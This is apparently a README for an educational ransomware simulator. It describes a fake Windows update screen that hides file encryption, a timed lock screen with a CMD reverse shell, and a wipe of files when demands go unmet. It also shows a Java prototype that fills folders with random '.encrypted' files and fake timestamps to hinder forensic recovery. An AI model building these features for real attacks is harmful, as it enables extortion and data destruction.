## Legal Disclaimer

This software is provided **strictly for educational, research, and ethical practice purposes only**.

-  **Do NOT use this tool on any system you do not own or have explicit permission to test.**
-  **Unauthorized use of this software may be illegal and is strictly prohibited.**
-  **The author takes no responsibility for any damage, data loss, or legal consequences resulting from misuse.**

By using this software, you agree to use it **ethically, lawfully**, and in **controlled environments such as CTFs, virtual labs, or testing networks**.

This tool is intended to help raise awareness and understanding of security threats — **not to promote or enable criminal activity**.

## Safety Features

- **Safe Decrypt Option:** Instantly restores files to prevent damage during testing.  
- **Reverse Shell:** Runs via Windows CMD for controlled simulation and has a connector for testing.  
- **Limited Impact:** Only files in a safe test folder are affected.

## Windows10FakeUpdate  
A fake Windows update screen used as a distraction that encrypts discovered files and estimates a time so it is ready and not as alarming to users. Furthermore, this behaviour can often be related to other malware types, such as viruses, that use that time to spread through vulnerabilities such as zero-days, or even install rootkits onto a compromised machine.

<p align="center">
  <img src="images/Windows10FakeUpdate.JPG" alt="WindowsFakeUpdate" />
</p>

## InitialPhase  
Initial lock screen phase with timer and shell connection. This is demonstrated as it is often used in real-world TTPs (Tactics, Techniques, and Procedures), and is commonly shown in attackers' OPSEC operations, which they can use to further escalate privileges or obfuscate logs.

<p align="center">
  <img src="images/FileLocker_BluePhase.JPG" alt="FirstPhase" />
</p>

## SecondPhase  
Critical phase with timer and increased demands, file deletion if requirements are met with simulated payment code. If demands are not met, this ethical ransomware runs a wipedown where the user's encrypted files are deleted, simulating similar behaviours to the NotPetya ransomware that would delete a compromised machine's files. In this case, it is simulated and only targets files in a specific directory.  

<p align="center">
  <img src="images/FileLocker_RedPhase.JPG" alt="SecondPhase" />
</p>

# Updates
A new feature is nearly complete that generates files with randomized names and content. It demonstrates how attackers use such tactics to lower the likelihood of data recovery and forensic analysis. Furthermore, techniques like this have appeared in real-world ransomware campaigns, including early WannaCry variants.
## Features included in prototype
- directory and file creation with random dates and times within a year period.
- multi threading added to improve speed
<details>
<summary>Show/Hide Code</summary>

```java

//Disclamer!
//To prevent any harm to your machine use this code in a safe/testing environment only.
//I do not take any liability for the codes use.

//Usage
//Only run this code in compliance with local laws and on systems you own or are authorized to test.


import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.FileTime;
import java.time.Instant;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {

    private static void setRandomFileTime(Path path) throws Exception{
        Random random = new Random();
        FileTime randomTime = FileTime.from(
                Instant.now().minusSeconds(random.nextInt(60 * 60 * 24 * 365))
        );
        BasicFileAttributeView view = Files.getFileAttributeView(path, BasicFileAttributeView.class);
        view.setTimes(randomTime, randomTime, randomTime);

    }

    public static void shutdown(){
        System.out.println("Process complete!");
        System.exit(0);
    }

    public static void DirectoryCreator(){

        ExecutorService executor = Executors.newFixedThreadPool(3);

        for (int rp = 0; rp < 15; rp++) {

            Random dir = new Random();
            String dirChars = "0123456789abcdef";   // characters to pick from
            StringBuilder name = new StringBuilder();

            for (int i = 0; i < 16; i++) {
                name.append(dirChars.charAt(dir.nextInt(dirChars.length())));
            }

            Path path = Paths.get(name+".encrypted");  // convert random string to Path

            try {
                Files.createDirectory(path);
                System.out.println("Directory created " + path);
                setRandomFileTime(Path.of(path.toString()));
                Random r = new Random();
                int fnum = r.nextInt(20);

                for (int frp = 0; frp < fnum; frp++) {

                    Random file = new Random();
                    String fileChars = "0123456789abcdef";

                    StringBuilder fileName = new StringBuilder();

                    for (int i = 0; i < 16; i++) {
                        fileName.append(fileChars.charAt(file.nextInt(fileChars.length())));
                    }

                    fileName.append(".encrypted");

                    Path testFile = Paths.get(name+".encrypted", fileName.toString());

                    Files.createFile(testFile);
                    setRandomFileTime(testFile);
                    System.out.println("File created: " + testFile);

                    FileWriter myWriter = new FileWriter(testFile.toFile());

                    String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                    Random random = new Random();
                    int num = random.nextInt(30);

                    for (; num > 0; num--) {
                        for (int i = 0; i < 64; i++) {
                            myWriter.write(chars.charAt(r.nextInt(chars.length())));
                        }
                    }

                    Random dirs = new Random();
                    String dirCharss = "0123456789abcdef";   // characters to pick from
                    StringBuilder names = new StringBuilder();

                    for (int i = 0; i < 16; i++) {
                        names.append(dirChars.charAt(dirs.nextInt(dirCharss.length())));
                    }

                    fileName.append(".encrypted");

                    Path testFilesz = Paths.get(name+".encrypted", fileName.toString());

                    Files.createDirectory(testFilesz);

                    myWriter.close();

                }



            } catch (Exception e) {
                System.out.println("Error "+e);
            }
        }
        shutdown();
    }

    public static void main(String[] args) {
        DirectoryCreator();
    }
}


```
</details> 

# Current isues
The current file discovery process fails when the specified path includes a directory. Once it encounters a directory, it is unable to encrypt any files contained within its subdirectories.

## Current file discovery
<p align="center">
  <img src="images/Diagrams/CurrentFileDiscoverer.png" alt="CurrentFileDiscovery" />
</p>

## Updated file discovery

<p align="center">
  <img src="images/Diagrams/ImprovedFileDiscoverer.png" alt="UpdatedFileDiscovery" />
</p>
